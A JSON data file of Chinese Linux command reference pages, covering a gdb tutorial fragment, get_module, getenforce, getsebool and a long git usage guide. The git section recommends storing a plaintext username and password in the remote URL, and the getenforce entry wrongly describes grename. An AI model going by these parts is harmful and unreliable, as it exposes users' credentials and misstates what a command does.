href=\"http://www.imooc.com/learn/394\">慕课网-Linux C语言指针与内存-第三章</a></p>\n</blockquote>\n<p>如果删除源代码, 就无法显示行号等辅助信息了</p>\n<pre><code class=\"language-shell\">gcc -g gdb.c -o gdb.<span class=\"hljs-keyword\">out</span> <span class=\"hljs-comment\"># -g 支持gdb调试; -o 输出, 默认为 a.out</span>\n\ngdb gdb.<span class=\"hljs-keyword\">out</span> <span class=\"hljs-comment\"># 进入 gdb 调试环境</span>\nenter <span class=\"hljs-comment\"># 继续执行上条命令</span>\nl <span class=\"hljs-comment\"># 列出源代码, 默认 10 行, 按 l 继续</span>\n\nstart <span class=\"hljs-comment\"># 开始单步调试, 默认 main() 第一行</span>\np a <span class=\"hljs-comment\"># 查看 a 变量的值</span>\nn <span class=\"hljs-comment\"># 继续到下一行</span>\ns <span class=\"hljs-comment\"># 进入子函数</span>\nbt <span class=\"hljs-comment\"># 查看函数栈</span>\nf <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\"># 切换函数栈</span>\n\nq 退出调试\n</code></pre>\n<p>测试用代码</p>\n<pre><code class=\"language-c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a, <span class=\"hljs-type\">int</span> b)</span></span>{\n    <span class=\"hljs-type\">int</span> tmp=a;\n    a=b; b=tmp;\n}\n\n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">change2</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> *a, <span class=\"hljs-type\">int</span> *b)</span></span>{\n    <span class=\"hljs-type\">int</span> tmp=*a;\n    *a=*b; *b=tmp;\n}\n\n<span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span>{\n    <span class=\"hljs-type\">int</span> a=<span class=\"hljs-number\">5</span>,b=<span class=\"hljs-number\">3</span>;\n    <span class=\"hljs-built_in\">change</span>(a,b);\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"change:\\na=%d\\nb=%d\\n\"</span>, a,b);\n    <span class=\"hljs-built_in\">change2</span>(&amp;a,&amp;b);\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"change2:\\na=%d\\nb=%d\\n\"</span>, a,b);\n}\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "get_module",
        "des": "获取Linux内核模块的详细信息",
        "body": "<h1 id=\"get_module\">get_module</h1>\n<p>获取Linux内核模块的详细信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>get_module命令</strong> 用于获取Linux内核模块的详细信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">get_module</span> 模块名\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用lsmod命令查看内核模块：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsmod</span> | head -<span class=\"hljs-number\">5</span>\n<span class=\"hljs-attribute\">Module</span>                  Size  Used by\n<span class=\"hljs-attribute\">ipv6</span>                  <span class=\"hljs-number\">272801</span>  <span class=\"hljs-number\">15</span>\n<span class=\"hljs-attribute\">xfrm_nalgo</span>             <span class=\"hljs-number\">13381</span>  <span class=\"hljs-number\">1</span> ipv6\n<span class=\"hljs-attribute\">crypto_api</span>             <span class=\"hljs-number\">12609</span>  <span class=\"hljs-number\">1</span> xfrm_nalgo\n<span class=\"hljs-attribute\">ip_conntrack_ftp</span>       <span class=\"hljs-number\">11569</span>  <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>使用get_module命令查看模块详细信息：</p>\n<pre><code class=\"language-shell\">get_module ipv6\n        refcnt               : <span class=\"hljs-number\">15</span>\n        srcversion           : 8CC9C024755B4483E56C0EF\n<span class=\"hljs-symbol\">\nParameters:</span>\n        autoconf             : <span class=\"hljs-number\">1</span>\n        disable              : <span class=\"hljs-number\">0</span>\n        disable_ipv6         : <span class=\"hljs-number\">0</span>\n<span class=\"hljs-symbol\">Sections:</span>\n<span class=\"hljs-meta\">        .altinstr_replacement</span> : <span class=\"hljs-number\">0xf8f1a3cf</span>\n<span class=\"hljs-meta\">        .altinstructions</span>     : <span class=\"hljs-number\">0xf8f1d03c</span>\n<span class=\"hljs-meta\">        .bss</span>                 : <span class=\"hljs-number\">0xf8f36000</span>\n<span class=\"hljs-meta\">        .data</span><span class=\"hljs-number\">.</span>read_mostly    : <span class=\"hljs-number\">0xf8f34d20</span>\n<span class=\"hljs-meta\">        .data</span>                : <span class=\"hljs-number\">0xf8f2f7a0</span>\n<span class=\"hljs-meta\">        .exit</span><span class=\"hljs-number\">.</span>text           : <span class=\"hljs-number\">0xf8f1a234</span>\n<span class=\"hljs-meta\">        .gnu</span><span class=\"hljs-number\">.</span>linkonce<span class=\"hljs-number\">.</span>this_module : <span class=\"hljs-number\">0xf8f34e00</span>\n<span class=\"hljs-meta\">        .init</span><span class=\"hljs-number\">.</span>data           : <span class=\"hljs-number\">0xf8a16a60</span>\n<span class=\"hljs-meta\">        .init</span><span class=\"hljs-number\">.</span>text           : <span class=\"hljs-number\">0xf8a16000</span>\n<span class=\"hljs-meta\">        .module_sig</span>          : <span class=\"hljs-number\">0xf8f37960</span>\n<span class=\"hljs-meta\">        .rodata</span><span class=\"hljs-number\">.</span>str1<span class=\"hljs-number\">.1</span>       : <span class=\"hljs-number\">0xf8f1ae46</span>\n<span class=\"hljs-meta\">        .rodata</span>              : <span class=\"hljs-number\">0xf8f1a420</span>\n<span class=\"hljs-meta\">        .smp_locks</span>           : <span class=\"hljs-number\">0xf8f1d150</span>\n<span class=\"hljs-meta\">        .strtab</span>              : <span class=\"hljs-number\">0xf8f29840</span>\n<span class=\"hljs-meta\">        .symtab</span>              : <span class=\"hljs-number\">0xf8f24000</span>\n<span class=\"hljs-meta\">        .text</span>                : <span class=\"hljs-number\">0xf8ef5000</span>\n        __kcrctab            : <span class=\"hljs-number\">0xf8f1de70</span>\n        __kcrctab_gpl        : <span class=\"hljs-number\">0xf8f1d9cc</span>\n        __ksymtab            : <span class=\"hljs-number\">0xf8f1dd78</span>\n        __ksymtab_gpl        : <span class=\"hljs-number\">0xf8f1d954</span>\n        __ksymtab_strings    : <span class=\"hljs-number\">0xf8f1da44</span>\n        __param              : <span class=\"hljs-number\">0xf8f1da08</span>\n        __versions           : <span class=\"hljs-number\">0xf8f1df00</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "getenforce",
        "des": "显示当前SELinux的应用模式，是强制、执行还是停用",
        "body": "<h1 id=\"getenforce\">getenforce</h1>\n<p>显示当前SELinux的应用模式，是强制、执行还是停用</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grename命令</strong> 可以重命名卷组的名称。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">getenforce</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>查看当前SELinux的应用模式。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># getenforce</span>\nEnforcing\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "getsebool",
        "des": "查询SElinux策略内各项规则的布尔值",
        "body": "<h1 id=\"getsebool\">getsebool</h1>\n<p>查询SElinux策略内各项规则的布尔值</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>getsebool命令</strong> 是用来查询SElinux策略内各项规则的布尔值。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">getsebool <span class=\"hljs-selector-attr\">[-a]</span> <span class=\"hljs-selector-attr\">[布尔值条款]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">a</span>：列出目前系统上面的所有布尔值条款设置为开启或关闭值。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>查询本系统内所有的布尔值设置状况：</p>\n<pre><code class=\"language-shell\">getsebool -a\nNetworkManager_disable_trans --&gt; <span class=\"hljs-literal\">off</span>\nallow_console_login --&gt; <span class=\"hljs-literal\">off</span>\nallow_cvs_read_shadow --&gt; <span class=\"hljs-literal\">off</span>\nallow_daemons_dump_core --&gt; <span class=\"hljs-literal\">on</span>\n....(底下省略)....\n</code></pre>\n<p>查询httpd_enable_homedirs是否为关闭，若没关闭，请关闭它：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">getsebool</span> httpd_enable_homedirs\n<span class=\"hljs-attribute\">setsebool</span> -P httpd_enable_homedirs=<span class=\"hljs-number\">0</span>    # <span class=\"hljs-number\">0</span>是关闭  <span class=\"hljs-number\">1</span>是开启\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "git",
        "des": "是目前世界上最先进的分布式版本控制系统",
        "body": "<h1 id=\"git\">git</h1>\n<p>是目前世界上最先进的分布式版本控制系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>git命令</strong> 很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。</p>\n<p>Linus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？</p>\n<p>事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！</p>\n<p>你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。</p>\n<p>不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。</p>\n<p>安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。</p>\n<p>Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：</p>\n<p>Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。</p>\n<p>Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。</p>\n<p>历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。</p>\n<p><a href=\"https://github.com/jaywcjlove/handbook/blob/master/other/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95.md\">Git常用命令清单</a></p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-comment\">[--version]</span> <span class=\"hljs-comment\">[--help]</span> <span class=\"hljs-comment\">[-C &lt;path&gt;]</span> <span class=\"hljs-comment\">[-c name=value]</span>\n   <span class=\"hljs-comment\">[--exec-path<span class=\"hljs-comment\">[=&lt;path&gt;]</span>]</span> <span class=\"hljs-comment\">[--html-path]</span> <span class=\"hljs-comment\">[--man-path]</span> <span class=\"hljs-comment\">[--info-path]</span>\n   <span class=\"hljs-comment\">[-p | --paginate | --no-pager]</span> <span class=\"hljs-comment\">[--no-replace-objects]</span> <span class=\"hljs-comment\">[--bare]</span>\n   <span class=\"hljs-comment\">[--git-dir=&lt;path&gt;]</span> <span class=\"hljs-comment\">[--work-tree=&lt;path&gt;]</span> <span class=\"hljs-comment\">[--namespace=&lt;name&gt;]</span>\n   &lt;command&gt; <span class=\"hljs-comment\">[&lt;args&gt;]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">add              将文件内容添加到索引\nbisect           通过二进制查找引入错误的更改\nbranch           列出，创建或删除分支\ncheckout         检查分支或路径到工作树\n<span class=\"hljs-keyword\">clone</span>            <span class=\"hljs-title\">将存储库克隆到新目录中\ncommit</span>           将更改记录到存储库\ndiff             显示提交，提交和工作树等之间的更改\nfetch            从另一个存储库下载对象和引用\ngrep             打印匹配图案的行\ninit             创建一个空的Git仓库或重新初始化一个现有的\nlog              显示提交日志\nmerge            加入两个或更多的开发历史\nmv               移动或重命名文件，目录或符号链接\npull             从另一个存储库或本地分支获取并合并\npush             更新远程引用以及相关对象\nrebase           转发端口本地提交到更新的上游头\nreset            将当前HEAD复位到指定状态\nrm               从工作树和索引中删除文件\nshow             显示各种类型的对象\nstatus           显示工作树状态\n<span class=\"hljs-keyword\">tag</span>              <span class=\"hljs-title\">创建，列出，删除或验证使用GPG</span>签名的标签对象\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>init</p>\n<p><code>git init</code> #初始化  </p>\n<p>status</p>\n<p><code>git status</code> #获取状态  </p>\n<p>add</p>\n<p><code>git add file</code> # .或*代表全部添加<br><code>git rm --cached &lt;added_file_to_undo&gt;</code> # 在commit之前撤销git add操作<br><code>git reset head</code> # 好像比上面<code>git rm --cached</code>更方便  </p>\n<p>commit</p>\n<p><code>git commit -m \"message\"</code> #此处注意乱码  </p>\n<p>remote</p>\n<p><code>git remote add origin git@github.com:JSLite/test.git</code> #添加源  </p>\n<p>push</p>\n<pre><code class=\"language-shell\">git push -u origin <span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\"># push</span>同事设置默认跟踪分支  \ngit push origin <span class=\"hljs-keyword\">master</span>  \n<span class=\"hljs-title\">git</span> push -f origin <span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\"># 强制推送文件，缩写 -f</span>（全写--force）\n</code></pre>\n<p>clone</p>\n<p><code>git clone git://github.com/JSLite/JSLite.js.git </code><br><code>git clone git://github.com/JSLite/JSLite.js.git mypro</code> #克隆到自定义文件夹<br><code>git clone [user@]example.com:path/to/repo.git/</code> #SSH协议还有另一种写法。  </p>\n<p>git clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。<code>git clone &lt;版本库的网址&gt; &lt;本地目录名&gt;</code>  </p>\n<pre><code class=\"language-shell\">$ git clone http[s]:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone ssh:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone git:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone <span class=\"hljs-regexp\">/opt/gi</span>t/project.git \n$ git clone file:<span class=\"hljs-regexp\">//</span><span class=\"hljs-regexp\">/opt/gi</span>t/project.git\n$ git clone ftp[s]:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone rsync:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n</code></pre>\n<h2 id=\"配置\">配置</h2>\n<p>首先是配置帐号信息 <code>ssh -T git@github.com</code> 测试。</p>\n<h2 id=\"修改项目中的个人信息\">修改项目中的个人信息</h2>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">help</span> config <span class=\"hljs-comment\"># 获取帮助信息，查看修改个人信息的参数  </span>\ngit config <span class=\"hljs-params\">--global</span> user.name <span class=\"hljs-string\">\"小弟调调\"</span>           <span class=\"hljs-comment\"># 修改全局名字</span>\ngit config <span class=\"hljs-params\">--global</span> user.email <span class=\"hljs-string\">\"wowohoo@qq.com\"</span>  <span class=\"hljs-comment\"># 修改全局邮箱</span>\ngit config <span class=\"hljs-params\">--list</span>         <span class=\"hljs-comment\"># 查看配置的信息  </span>\n</code></pre>\n<h3 id=\"配置自动换行\">配置自动换行</h3>\n<p>自动转换坑太大，提交到git是自动将换行符转换为lf </p>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">config</span> --<span class=\"hljs-keyword\">global</span> core<span class=\"hljs-variable\">.autocrlf</span> <span class=\"hljs-keyword\">input</span>\n</code></pre>\n<h2 id=\"常见使用场景\">常见使用场景</h2>\n<h3 id=\"创建ssh密钥\">创建SSH密钥</h3>\n<p>这个密钥用来跟 github 通信，在本地终端里生成然后上传到 github</p>\n<pre><code class=\"language-shell\">ssh-keygen -t rsa -C <span class=\"hljs-string\">'wowohoo@qq.com'</span> <span class=\"hljs-comment\"># 生成密钥  </span>\nssh-keygen -t rsa -C <span class=\"hljs-string\">\"wowohoo@qq.com\"</span> -f ~<span class=\"hljs-regexp\">/.ssh/</span>ww_rsa <span class=\"hljs-comment\"># 指定生成目录文件名字</span>\nssh -T git@github.com <span class=\"hljs-comment\"># 测试是否成功  </span>\n</code></pre>\n<h3 id=\"多账号ssh配置\">多账号ssh配置</h3>\n<p><strong>1.生成指定名字的密钥</strong></p>\n<p><code>ssh-keygen -t rsa -C \"邮箱地址\" -f ~/.ssh/jslite_rsa</code><br>会生成 <code>jslite_rsa</code> 和 <code>jslite_rsa.pub</code> 这两个文件  </p>\n<p><strong>2.密钥复制到托管平台上</strong></p>\n<p><code>vim ~/.ssh/jslite_rsa.pub</code><br>打开公钥文件 <code>jslite_rsa.pub</code> ，并把内容复制至代码托管平台上   </p>\n<p><strong>3.修改config文件</strong></p>\n<p><code>vim ~/.ssh/config</code> #修改config文件，如果没有创建 <code>config</code>  </p>\n<pre><code class=\"language-shell\">Host jslite.github.com\n  HostName github.com\n  <span class=\"hljs-keyword\">User</span> <span class=\"hljs-title\">git</span>\n  IdentityFile ~/.ssh/jslite_rsa\n\nHost work.github.com\n  HostName github.com\n  <span class=\"hljs-comment\"># Port 服务器open-ssh端口（默认：22,默认时一般不写此行）</span>\n  <span class=\"hljs-comment\"># PreferredAuthentications 配置登录时用什么权限认证 </span>\n  <span class=\"hljs-comment\">#                          publickey|password publickey|keyboard-interactive等</span>\n  <span class=\"hljs-keyword\">User</span> <span class=\"hljs-title\">git</span>\n  IdentityFile ~/.ssh/work_rsa\n</code></pre>\n<ul>\n<li><code>Host</code> 这里是个别名可以随便命名</li>\n<li><code>HostName</code> 一般是网站如：<code>git@ss.github.com:username/repo.git</code> 填写 <code>github.com</code></li>\n<li><code>User</code> 通常填写<code>git</code></li>\n<li><code>IdentityFile</code> 使用的公钥文件地址</li>\n</ul>\n<p><strong>4.测试</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ssh</span> -T git<span class=\"hljs-variable\">@jslite</span>.github.com  <span class=\"hljs-comment\"># `@`后面跟上定义的Host  </span>\nssh -T work.github.com        <span class=\"hljs-comment\"># 通过别名测试</span>\nssh -i ~/公钥文件地址 Host别名  <span class=\"hljs-comment\"># 如 ssh -i ~/.ssh/work_rsa work.github.com</span>\n</code></pre>\n<p><strong>5.使用</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 原来的写法</span>\ngit <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-title\">git</span>@github.com:<span class=\"hljs-tag\">&lt;jslite的用户名&gt;</span>/learngit.git\n<span class=\"hljs-comment\"># 现在的写法</span>\ngit <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-title\">git</span>@jslite.github.com:<span class=\"hljs-tag\">&lt;jslite的用户名&gt;</span>/learngit.git\ngit <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-title\">git</span>@work.github.com:<span class=\"hljs-tag\">&lt;work的用户名&gt;</span>/learngit.git\n</code></pre>\n<p><strong>5.注意</strong></p>\n<p>如果你修改了id_rsa的名字，你需要将ssh key添加到SSH agent中，如：</p>\n<pre><code class=\"language-shell\">ssh-<span class=\"hljs-built_in\">add</span> ~/.ssh/jslite_rsa\nssh-<span class=\"hljs-built_in\">add</span> -l  # 查看所有的key\nssh-<span class=\"hljs-built_in\">add</span> -D  # 删除所有的key\nssh-<span class=\"hljs-built_in\">add</span> -d  ~/.ssh/jslite_rsa # 删除指定的key\n</code></pre>\n<h3 id=\"免密码登录远程服务器\">免密码登录远程服务器</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>ssh-keygen -t rsa -P <span class=\"hljs-string\">''</span> -f ~<span class=\"hljs-regexp\">/.ssh/aliyunserver</span>.key\n<span class=\"hljs-variable\">$ </span>ssh-copy-id -i ~<span class=\"hljs-regexp\">/.ssh/aliyunserver</span>.key.pub root<span class=\"hljs-variable\">@192</span>.<span class=\"hljs-number\">168.182</span>.<span class=\"hljs-number\">112</span> <span class=\"hljs-comment\"># 这里需要输入密码一次</span>\n</code></pre>\n<p>编辑 <code>~/.ssh/config</code></p>\n<pre><code class=\"language-shell\">Host aliyun1\n  HostName <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">182.112</span>\n  <span class=\"hljs-keyword\">User</span> <span class=\"hljs-title\">root</span>\n  PreferredAuthentications publickey\n  IdentityFile ~/.ssh/aliyunserver.key\n</code></pre>\n<p>上面配置完了，可以通过命令登录，不需要输入IP地址和密码 <code>ssh aliyun1</code></p>\n<h3 id=\"https协议下提交代码免密码\">https协议下提交代码免密码</h3>\n<pre><code class=\"language-shell\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/username/</span>rep.git\n</code></pre>\n<p>通过上面方式克隆可能需要密码，解决办法：进入当前克隆的项目 <code>vi rep/.git/config</code> 编辑 <code>config</code>, 按照下面方式修改，你就可以提交代码不用输入密码了。</p>\n<pre><code class=\"language-shell\">[core]\n    repositoryformatversion = <span class=\"hljs-number\">0</span>\n    filemode = true\n    bare = false\n    logallrefupdates = true\n    ignorecase = true\n    precomposeunicode = true\n[remote <span class=\"hljs-string\">\"origin\"</span>]\n-    url = https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/username/</span>rep.git\n+    url = https:<span class=\"hljs-regexp\">//</span>用户名:密码@github.com<span class=\"hljs-regexp\">/username/</span>rep.git\n    fetch = +refs<span class=\"hljs-regexp\">/heads/</span>*:refs<span class=\"hljs-regexp\">/remotes/</span>origin/*\n[branch <span class=\"hljs-string\">\"master\"</span>]\n    remote = origin\n    merge = refs<span class=\"hljs-regexp\">/heads/m</span>aster\n</code></pre>\n<h3 id=\"文件推向3个git库\">文件推向3个git库</h3>\n<p><strong>1. 增加3个远程库地址</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">git</span> <span class=\"hljs-string\">remote</span> <span class=\"hljs-string\">add</span> <span class=\"hljs-string\">origin</span> <span class=\"hljs-string\">https</span>://<span class=\"hljs-string\">github</span>.<span class=\"hljs-string\">com</span>/<span class=\"hljs-string\">JSLite</span>/<span class=\"hljs-string\">JSLite</span>.<span class=\"hljs-string\">git</span>  \n<span class=\"hljs-string\">git</span> <span class=\"hljs-string\">remote</span> <span class=\"hljs-built_in\">set-url</span> <span class=\"hljs-built_in\">--add</span> <span class=\"hljs-string\">origin</span> <span class=\"hljs-string\">https</span>://<span class=\"hljs-string\">gitlab</span>.<span class=\"hljs-string\">com</span>/<span class=\"hljs-string\">wang</span>/<span class=\"hljs-string\">JSLite</span>.<span class=\"hljs-string\">js</span>.<span class=\"hljs-string\">git</span>  \n<span class=\"hljs-string\">git</span> <span class=\"hljs-string\">remote</span> <span class=\"hljs-built_in\">set-url</span> <span class=\"hljs-built_in\">--add</span> <span class=\"hljs-string\">origin</span> <span class=\"hljs-string\">https</span>://<span class=\"hljs-string\">oschina</span>.<span class=\"hljs-string\">net</span>/<span class=\"hljs-string\">wang</span>/<span class=\"hljs-string\">JSLite</span>.<span class=\"hljs-string\">js</span>.<span class=\"hljs-string\">git</span>  \n</code></pre>\n<p><strong>2. 删除其中一个 set-url 地址</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">usage</span>: <span class=\"hljs-string\">git</span> <span class=\"hljs-string\">remote</span> <span class=\"hljs-built_in\">set-url</span> [<span class=\"hljs-built_in\">--push]</span> &lt;<span class=\"hljs-string\">name</span>&gt; &lt;<span class=\"hljs-string\">newurl</span>&gt; [&lt;<span class=\"hljs-string\">oldurl</span>&gt;]\n   <span class=\"hljs-string\">or</span>: <span class=\"hljs-string\">git</span> <span class=\"hljs-string\">remote</span> <span class=\"hljs-built_in\">set-url</span> <span class=\"hljs-built_in\">--add</span> &lt;<span class=\"hljs-string\">name</span>&gt; &lt;<span class=\"hljs-string\">newurl</span>&gt;\n   <span class=\"hljs-string\">or</span>: <span class=\"hljs-string\">git</span> <span class=\"hljs-string\">remote</span> <span class=\"hljs-built_in\">set-url</span> <span class=\"hljs-built_in\">--delete</span> &lt;<span class=\"hljs-string\">name</span>&gt; &lt;<span class=\"hljs-string\">url</span>&gt;\n</code></pre>\n<p><code>git remote set-url --delete origin https://oschina.net/wang/JSLite.js.git</code></p>\n<p><strong>3.推送代码</strong></p>\n<pre><code class=\"language-shell\">git push origin <span class=\"hljs-keyword\">master</span>\n<span class=\"hljs-title\">git</span> push -f origin <span class=\"hljs-keyword\">master</span>  <span class=\"hljs-title\"># 强制推送  </span>\n</code></pre>\n<p><strong>4.拉代码</strong></p>\n<p>只能拉取 <code>origin</code> 里的一个url地址，这个fetch-url<br>默认为你添加的到 <code>origin</code>的第一个地址  </p>\n<pre><code class=\"language-shell\">git pull origin <span class=\"hljs-keyword\">master</span>   \n<span class=\"hljs-title\">git</span> pull --all <span class=\"hljs-comment\"># 获取远程所有内容包括tag  </span>\ngit pull origin next:<span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\"># 取回origin</span>主机的next分支，与本地的<span class=\"hljs-literal\">master</span>分支合并  \ngit pull origin next <span class=\"hljs-comment\"># 远程分支是与当前分支合并  </span>\n\n<span class=\"hljs-comment\"># 上面一条命令等同于下面两条命令   </span>\ngit fetch origin  \ngit merge origin/next  \n</code></pre>\n<p>如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支。<br>但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。  </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>git pull -p\n<span class=\"hljs-comment\"># 等同于下面的命令</span>\n<span class=\"hljs-variable\">$ </span>git fetch --prune origin \n<span class=\"hljs-variable\">$ </span>git fetch -p\n</code></pre>\n<p><strong>5.更改pull</strong></p>\n<p>只需要更改config文件里，那三个url的顺序即可，fetch-url会直接对应排行第一的那个utl连接。    </p>\n<h3 id=\"修改远程仓库地址\">修改远程仓库地址</h3>\n<pre><code class=\"language-shell\">git remote remove <span class=\"hljs-keyword\">origin </span> <span class=\"hljs-comment\"># 删除该远程路径  </span>\ngit remote <span class=\"hljs-keyword\">add </span><span class=\"hljs-keyword\">origin </span>git@<span class=\"hljs-keyword\">jslite.github.com:JSLite/JSLite.git </span> <span class=\"hljs-comment\"># 添加远程路径 </span>\n</code></pre>\n<h3 id=\"撤销远程记录\">撤销远程记录</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">reset</span> --hard HEAD~<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\"># 撤销一条记录   </span>\ngit <span class=\"hljs-keyword\">push</span> -f origin HEAD:master <span class=\"hljs-comment\"># 同步到远程仓库  </span>\n</code></pre>\n<h3 id=\"放弃本地的文件修改\">放弃本地的文件修改</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">git</span> <span class=\"hljs-string\">reset</span> <span class=\"hljs-built_in\">--hard</span> <span class=\"hljs-string\">FETCH_HEAD</span> <span class=\"hljs-comment\"># FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull</span>\n</code></pre>\n<p><code>git reset --hard FETCH_HEAD</code> 出现错误</p>\n<pre><code class=\"language-shell\">git pull\nYou are <span class=\"hljs-keyword\">not</span> currently <span class=\"hljs-keyword\">on</span> a branch, so I cannot <span class=\"hljs-keyword\">use</span> any\n<span class=\"hljs-symbol\">'branch</span>.&lt;branchname&gt;.merge' <span class=\"hljs-keyword\">in</span> your <span class=\"hljs-keyword\">configuration</span> <span class=\"hljs-keyword\">file</span>.\nPlease specify which remote branch you want <span class=\"hljs-keyword\">to</span> <span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">on</span> the command\n<span class=\"hljs-literal\">line</span> <span class=\"hljs-keyword\">and</span> try again (e.g. <span class=\"hljs-symbol\">'git</span> pull &lt;repository&gt; &lt;refspec&gt;').\nSee git-pull(<span class=\"hljs-number\">1</span>) <span class=\"hljs-keyword\">FOR</span> details.\n</code></pre>\n<p>解决方法：</p>\n<pre><code class=\"language-shell\">git checkout -b temp <span class=\"hljs-comment\"># 